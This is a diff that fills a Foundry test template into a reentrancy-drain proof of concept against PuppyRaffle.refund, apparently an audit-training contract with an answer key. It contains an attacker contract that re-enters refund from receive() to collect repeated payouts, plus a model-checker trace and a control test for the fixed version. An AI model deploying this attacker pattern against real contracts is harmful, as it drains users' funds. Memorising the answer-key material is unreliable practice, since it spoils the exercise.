@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity {{PRAGMA}};
+pragma solidity ^0.7.6;
 pragma abicoder v2;
 
 // Foundry test template - ReentrancyDrain shape
@@ -15,24 +15,28 @@ pragma abicoder v2;
 //   examples/puppy-raffle/.ANSWERS.md H-1
 //
 // TLC counterexample trace head (for the @notice block):
-// {{TLC_TRACE_HEAD}}
+// // State 0: slot=Live, paid=0, reentries=0
+//   Action: PreCheckBuggy(e)
+// State 1: slot=Calling, paid=TicketPrice, reentries=1
+//   Action: ReenterBuggy(e)
+// State 2: slot=Calling, paid=2*TicketPrice, reentries=2  ← INVARIANT VIOLATED
 //
-// This test FAILS (asserts) on the buggy version of {{TARGET_CONTRACT}}.{{TARGET_FN}}
+// This test FAILS (asserts) on the buggy version of PuppyRaffle.refund
 // and PASSES on the CEI-correct version where the slot is cleared first.
 
 import {Test} from "forge-std/Test.sol";
-import {{{TARGET_CONTRACT}}} from "{{TARGET_PATH}}";
+import {PuppyRaffle} from "src/PuppyRaffle.sol";
 
-/// Attacker contract — calls back into {{TARGET_CONTRACT}}.{{TARGET_FN}} from receive().
+/// Attacker contract — calls back into PuppyRaffle.refund from receive().
 /// The buggy victim sees its slot as Live both times because the slot-clear
 /// step doesn't fire until after both calls return.
 contract ReentrancyAttacker {
-    {{TARGET_CONTRACT}} public victim;
+    PuppyRaffle public victim;
     uint256 public attackArg;
     uint256 public callsRemaining;
     uint256 public callsExecuted;
 
-    constructor({{TARGET_CONTRACT}} _victim) {
+    constructor(PuppyRaffle _victim) {
         victim = _victim;
     }
 
@@ -43,7 +47,7 @@ contract ReentrancyAttacker {
         callsExecuted = 0;
         // Initial call into victim — this is the entry whose nested receive()
         // will recursively call back in.
-        victim.{{TARGET_FN}}({{TARGET_FN_CALL_ARGS}});
+        victim.refund(0);
     }
 
     /// Re-entry hook. Each ETH payment triggers this; we call back into the
@@ -56,22 +60,22 @@ contract ReentrancyAttacker {
             // Per the TLC counterexample (action ReenterBuggy), the slot
             // is still observed as Live here because PreCheckBuggy's slot
             // transition to "Calling" doesn't trigger the slot-clear effect.
-            victim.{{TARGET_FN}}({{TARGET_FN_CALL_ARGS}});
+            victim.refund(0);
         }
     }
 }
 
 contract ReentrancyDrain_PoC is Test {
-    {{TARGET_CONTRACT}} public victim;
+    PuppyRaffle public victim;
     ReentrancyAttacker public attacker;
     uint256 constant ENTRANCE_FEE = 1 ether;
 
     // setUp baked for the canonical instance (puppy-raffle H-1). If your
-    // {{TARGET_CONTRACT}} takes different constructor args, edit the lines
+    // PuppyRaffle takes different constructor args, edit the lines
     // below. Verified end-to-end via plumbline tlc_to_forge 2026-06-09.
     function setUp() public {
         //         // Constructor: (entranceFee, feeAddress, raffleDuration)
-        victim = new {{TARGET_CONTRACT}}(ENTRANCE_FEE, address(0xBEEF), 1 weeks);
+        victim = new PuppyRaffle(ENTRANCE_FEE, address(0xBEEF), 1 weeks);
         attacker = new ReentrancyAttacker(victim);
 
         // Register attacker as player 0 (needed for refund eligibility).
@@ -88,13 +92,13 @@ contract ReentrancyDrain_PoC is Test {
         honest[2] = address(0x3);
         vm.deal(address(this), 10 ether);
         victim.enterRaffle{value: ENTRANCE_FEE * 3}(honest);
-        // victim = new {{TARGET_CONTRACT}}(/* constructor args here */);
+        // victim = new PuppyRaffle(/* constructor args here */);
         // attacker = new ReentrancyAttacker(victim);
         // _registerAttackerAsEntry();
         // _fundVictim(10 ether);
     }
 
-    /// @notice The invariant {{INVARIANT_BROKEN}} from
+    /// @notice The invariant ClaimedAtMostOnce from
     ///         docs/tla/ReentrancyDrain.tla MUST hold:
     ///         each entry is paid out AT MOST TicketPrice once.
     ///         The TLC counterexample drives `paid[e] = k * TicketPrice`
@@ -108,7 +112,7 @@ contract ReentrancyDrain_PoC is Test {
         // PreCheckBuggy → ReenterBuggy → ReenterBuggy → PostClearBuggy
         // unwind. callDepth=2 is sufficient to demonstrate violation;
         // 3 just makes the drain magnitude more obvious.
-        attacker.attack({{TARGET_FN_CALL_ARGS}}, 3);
+        attacker.attack(0, 3);
 
         uint256 attackerBalanceAfter = address(attacker).balance;
         uint256 victimBalanceAfter = address(victim).balance;
@@ -128,12 +132,12 @@ contract ReentrancyDrain_PoC is Test {
         //          attacker.callsExecuted() * TICKET_PRICE);
     }
 
-    /// @notice Negative control: the CEI-correct version of {{TARGET_FN}}
+    /// @notice Negative control: the CEI-correct version of refund
     ///         clears the slot BEFORE the external call. Re-entry sees
     ///         slot = Cleared and the guard rejects. attacker.callsExecuted()
     ///         should be exactly 1.
     function test_ReentrancyDrain_correctFlow_passes() public {
-        // TODO: requires the fixed version of {{TARGET_CONTRACT}} deployed.
+        // TODO: requires the fixed version of PuppyRaffle deployed.
         // For now this is a documentation skeleton — fill when the fix
         // is available so we can demonstrate the rule of two.
         // vm.skip(true);
